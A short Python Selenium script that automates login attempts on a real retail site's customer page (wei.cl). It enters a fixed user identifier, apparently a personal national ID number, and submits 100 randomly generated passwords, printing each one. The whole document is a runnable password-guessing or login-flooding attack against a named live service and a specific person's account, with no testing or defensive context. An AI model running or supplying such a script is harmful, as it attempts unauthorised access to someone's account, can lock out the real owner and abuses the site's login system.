import string
import time
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome()
driver.get('https://www.wei.cl/cliente/ingreso')
time.sleep(5)
letters = string.ascii_letters + string.digits
for x in range(100):
    usr = driver.find_element_by_id("client-username")
    usr.clear()
    usr.send_keys("20189579-0")
    psw = driver.find_element_by_id("client-password")
    str = ''.join(random.choice(letters) for i in range(random.randrange(6,10)))
    psw.send_keys(str)
    print(str)
    clk = driver.find_element_by_xpath('//*[@id="form-ingreso-window"]/button').submit()
    time.sleep(1)
    psw.clear()
